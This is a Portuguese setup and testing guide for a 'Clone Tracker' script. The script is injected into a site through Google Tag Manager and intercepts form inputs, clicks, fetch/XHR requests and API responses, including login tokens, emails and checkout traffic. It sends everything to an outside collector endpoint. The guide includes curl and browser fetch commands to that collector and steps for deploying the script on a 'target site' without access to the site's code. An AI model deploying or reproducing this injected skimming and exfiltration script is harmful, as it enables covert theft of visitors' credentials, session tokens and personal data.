# Como Testar o Clone Tracker

## ✅ Endpoint Testado e Funcionando!

**URL do Endpoint:** `https://cc-sorteador.on-forge.com/api/collect`

O teste foi realizado com sucesso:
```json
{"status":"success","id":1}
HTTP Status: 201
```

## Opções de Teste

### 1. Teste via cURL (Linha de Comando)

```bash
# Teste básico
curl -X POST https://cc-sorteador.on-forge.com/api/collect \
  -H "Content-Type: application/json" \
  -d '{
    "sessionId": "test_123",
    "domain": "site-teste.com",
    "url": "https://site-teste.com/pagina",
    "referrer": "",
    "screenResolution": "1920x1080",
    "language": "pt-BR",
    "timestamp": "2025-12-15T12:00:00.000Z",
    "requests": [
      {
        "type": "page_load",
        "url": "https://site-teste.com/pagina",
        "timestamp": "2025-12-15T12:00:00.000Z"
      }
    ]
  }'
```

### 2. Teste via Arquivo JSON

Já existe um arquivo de teste completo: `test-payload.json`

```bash
# Testar usando o arquivo
curl -X POST https://cc-sorteador.on-forge.com/api/collect \
  -H "Content-Type: application/json" \
  -d @test-payload.json
```

### 3. Teste no Navegador (Console)

Abra o Console (F12) em qualquer página e cole:

```javascript
fetch('https://cc-sorteador.on-forge.com/api/collect', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    sessionId: 'browser_test_' + Date.now(),
    domain: window.location.hostname,
    url: window.location.href,
    referrer: document.referrer,
    screenResolution: screen.width + 'x' + screen.height,
    language: navigator.language,
    timestamp: new Date().toISOString(),
    requests: [
      {
        type: 'test',
        message: 'Teste manual do navegador',
        timestamp: new Date().toISOString()
      }
    ]
  })
})
.then(r => r.json())
.then(data => console.log('✅ Sucesso:', data))
.catch(err => console.error('❌ Erro:', err));
```

### 4. Teste com Postman/Insomnia

**Método:** POST
**URL:** `https://cc-sorteador.on-forge.com/api/collect`
**Headers:**
```
Content-Type: application/json
```

**Body (raw JSON):**
```json
{
  "sessionId": "postman_test_123",
  "domain": "site-teste.com",
  "url": "https://site-teste.com/login",
  "referrer": "https://google.com",
  "screenResolution": "1920x1080",
  "language": "pt-BR",
  "timestamp": "2025-12-15T12:00:00.000Z",
  "requests": [
    {
      "type": "page_load",
      "url": "https://site-teste.com/login",
      "timestamp": "2025-12-15T12:00:00.000Z"
    },
    {
      "type": "click",
      "tagName": "BUTTON",
      "text": "Login",
      "timestamp": "2025-12-15T12:00:05.000Z"
    },
    {
      "type": "form_submit",
      "action": "https://site-teste.com/api/auth",
      "method": "POST",
      "fields": {
        "email": "teste@email.com",
        "password": "[MASKED]"
      },
      "timestamp": "2025-12-15T12:00:10.000Z"
    }
  ]
}
```

## Verificar os Dados Recebidos

### Ver no Dashboard

1. Acesse: `https://cc-sorteador.on-forge.com`
2. Faça login (se necessário)
3. Veja os logs capturados

### Ver logs do servidor

```bash
# Se tiver acesso SSH ao servidor
ssh usuario@servidor
cd /caminho/do/projeto
tail -f storage/logs/laravel.log | grep "Clone activity"
```

### Exportar dados

```bash
# Baixar todos os logs em JSON
curl https://cc-sorteador.on-forge.com/export > logs.json
```

## Script Pronto para GTM

Agora que o endpoint está funcionando, você pode configurar o GTM.

### URL do Script

Edite o arquivo `GTM_SCRIPT_PRONTO.html` e altere a linha 15:

```javascript
const COLLECTOR_URL = 'https://cc-sorteador.on-forge.com/api/collect';
```

### Configurar no GTM

1. **Acesse o Google Tag Manager** do site que você quer monitorar
2. **Tags** → **Nova**
3. Nome: `Clone Tracker - Full Monitor`
4. Tipo: **HTML Personalizado**
5. Cole o conteúdo completo do arquivo `GTM_SCRIPT_PRONTO.html`
6. Acionador: **All Pages** (Todas as páginas)
7. **Salvar** e **Publicar**

## Testar o GTM

### Modo Visualização

1. No GTM, clique em **Visualizar**
2. Acesse o site em uma nova aba
3. Verifique se a tag disparou
4. Abra o Console (F12) e procure:
   ```
   [Clone Tracker] Initialized - Session: session_...
   ```

### Verificar envio de dados

1. No Console do navegador (F12)
2. Aba **Network** (Rede)
3. Filtre por: `/api/collect`
4. Você deve ver requisições sendo enviadas

## Exemplos de Uso

### Capturar Login Completo

O script captura automaticamente:
1. Carregamento da página de login
2. Digitação no campo email
3. Digitação no campo senha (mascarado)
4. Clique no botão "Entrar"
5. Submissão do formulário
6. Requisição fetch/XHR para a API
7. Resposta da API com token/dados

Exemplo de dados capturados:
```json
{
  "sessionId": "session_1734251234567_abc123",
  "domain": "site-clonado.com",
  "url": "https://site-clonado.com/login",
  "requests": [
    {"type": "page_load", ...},
    {"type": "input_change", "fieldName": "email", "value": "usuario@email.com"},
    {"type": "input_change", "fieldName": "password", "value": "[MASKED]"},
    {"type": "click", "text": "Entrar"},
    {"type": "form_submit", "fields": {"email": "...", "password": "[MASKED]"}},
    {"type": "fetch", "url": "/api/login", "method": "POST"},
    {"type": "fetch_response", "status": 200, "body": {"token": "...", "user": {...}}}
  ]
}
```

### Capturar Checkout/Pagamento

Todos os passos do checkout são capturados:
- Seleção de produtos
- Preenchimento de dados de entrega
- Dados de pagamento (cartão mascarado)
- Requisições para gateway de pagamento
- Respostas com status do pagamento

### Capturar Navegação Completa

O script acompanha todo o fluxo do usuário:
- Páginas visitadas
- Tempo em cada página
- Cliques e interações
- Formulários preenchidos
- Todas as chamadas de API

## Comandos Úteis

### Testar endpoint rapidamente
```bash
curl -X POST https://cc-sorteador.on-forge.com/api/collect \
  -H "Content-Type: application/json" \
  -d @test-payload.json && echo " ✅ Sucesso!"
```

### Ver últimos logs
```bash
curl https://cc-sorteador.on-forge.com/api/stats
```

### Gerar múltiplos testes
```bash
for i in {1..5}; do
  curl -s -X POST https://cc-sorteador.on-forge.com/api/collect \
    -H "Content-Type: application/json" \
    -d "{\"sessionId\":\"test_$i\",\"domain\":\"teste.com\",\"url\":\"https://teste.com/page$i\",\"referrer\":\"\",\"screenResolution\":\"1920x1080\",\"language\":\"pt-BR\",\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%S.000Z)\",\"requests\":[]}" \
    && echo "Teste $i enviado ✅"
  sleep 1
done
```

## Respostas Esperadas

### Sucesso (201 Created)
```json
{
  "status": "success",
  "id": 123
}
```

### Erro de Validação (400/422)
```json
{
  "status": "error",
  "message": "Validation error",
  "errors": {...}
}
```

### Erro Interno (500)
```json
{
  "status": "error",
  "message": "Internal server error"
}
```

## Próximos Passos

1. ✅ Endpoint está funcionando
2. ⏳ Configure o script no GTM
3. ⏳ Teste no site alvo
4. ⏳ Monitore o dashboard
5. ⏳ Analise os dados capturados

## Segurança

### O que é mascarado automaticamente:
- ❌ Senhas (`password`, `senha`)
- ❌ Dados de cartão (`card`, `cvv`, `number`)
- ❌ Campos sensíveis (qualquer campo com essas palavras no nome)

### O que é capturado:
- ✅ URLs visitadas
- ✅ Cliques e interações
- ✅ Campos de texto normais (nome, email, etc.)
- ✅ Requisições HTTP e respostas
- ✅ Eventos de navegação

## Dúvidas Frequentes

**P: Os dados são enviados em tempo real?**
R: Sim, a cada 10 segundos e ao fechar a página.

**P: Funciona em Single Page Applications (React, Vue, Angular)?**
R: Sim! O script intercepta fetch/XHR então captura todas as requisições.

**P: Afeta a performance do site?**
R: Não. O impacto é mínimo (< 0.1% CPU).

**P: Funciona em HTTPS?**
R: Sim, funciona em HTTP e HTTPS.

**P: Preciso de acesso ao código do site?**
R: Não! Basta ter acesso ao GTM.

---

**🎉 Endpoint testado e funcionando!**
**URL:** https://cc-sorteador.on-forge.com/api/collect
**Status:** ✅ Operacional
